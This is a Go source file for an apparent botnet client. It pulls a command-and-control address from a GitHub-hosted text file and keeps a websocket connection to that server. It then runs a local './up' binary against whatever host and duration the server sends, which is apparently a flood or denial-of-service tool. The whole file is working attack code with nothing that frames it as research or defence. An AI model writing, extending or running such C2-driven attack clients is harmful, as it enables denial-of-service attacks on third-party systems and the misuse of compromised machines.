package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

const addrURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/server/addr.txt"

type Command struct {
	Host     string `json:"host"`
	Duration string `json:"duration"`
	Method   string `json:"method"`
}

// fetchAddr mengambil ip:port dari addr.txt di GitHub
func fetchAddr() (string, error) {
	resp, err := http.Get(addrURL)
	if err != nil {
		return "", fmt.Errorf("http get: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read body: %w", err)
	}

	addr := strings.TrimSpace(string(body))
	if addr == "" {
		return "", fmt.Errorf("addr.txt is empty")
	}
	return addr, nil
}

func listen(conn *websocket.Conn) {
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("read error: %v", err)
			return
		}

		var cmd Command
		if err := json.Unmarshal(msg, &cmd); err != nil {
			log.Printf("invalid command: %v", err)
			continue
		}

		log.Printf("received command: host=%s duration=%s method=%s", cmd.Host, cmd.Duration, cmd.Method)
		go runCommand(cmd)
	}
}

func runCommand(cmd Command) {
	args := []string{cmd.Host, cmd.Duration, "50000"}
	log.Printf("running: ./up %s %s 50000", cmd.Host, cmd.Duration)

	out, err := exec.Command("./up", args...).CombinedOutput()
	if err != nil {
		log.Printf("command error: %v\noutput: %s", err, string(out))
		return
	}
	log.Printf("command done:\n%s", string(out))
}

func main() {
	var currentAddr string

	for {
		// Ambil addr terbaru dari GitHub
		addr, err := fetchAddr()
		if err != nil {
			log.Printf("failed to fetch addr: %v — retrying in 10s", err)
			time.Sleep(10 * time.Second)
			continue
		}

		if addr != currentAddr {
			if currentAddr == "" {
				log.Printf("addr: %s", addr)
			} else {
				log.Printf("addr changed: %s -> %s", currentAddr, addr)
			}
			currentAddr = addr
		}

		wsAddr := fmt.Sprintf("ws://%s/recon", currentAddr)
		log.Printf("connecting to %s ...", wsAddr)

		conn, _, err := websocket.DefaultDialer.Dial(wsAddr, nil)
		if err != nil {
			log.Printf("connection failed: %v — retrying in 5s", err)
			time.Sleep(5 * time.Second)
			continue
		}

		log.Println("connected to C2")

		// Jalankan polling addr di goroutine terpisah
		// Jika addr berubah, tutup koneksi agar loop utama reconnect ke addr baru
		done := make(chan struct{})
		go func() {
			ticker := time.NewTicker(15 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return
				case <-ticker.C:
					newAddr, err := fetchAddr()
					if err != nil {
						log.Printf("poll addr error: %v", err)
						continue
					}
					if newAddr != currentAddr {
						log.Printf("addr updated: %s -> %s, reconnecting...", currentAddr, newAddr)
						currentAddr = newAddr
						conn.Close() // trigger listen() untuk return
						return
					}
				}
			}
		}()

		listen(conn)
		close(done)
		conn.Close()

		log.Println("disconnected, retrying in 5s")
		time.Sleep(5 * time.Second)
	}
}
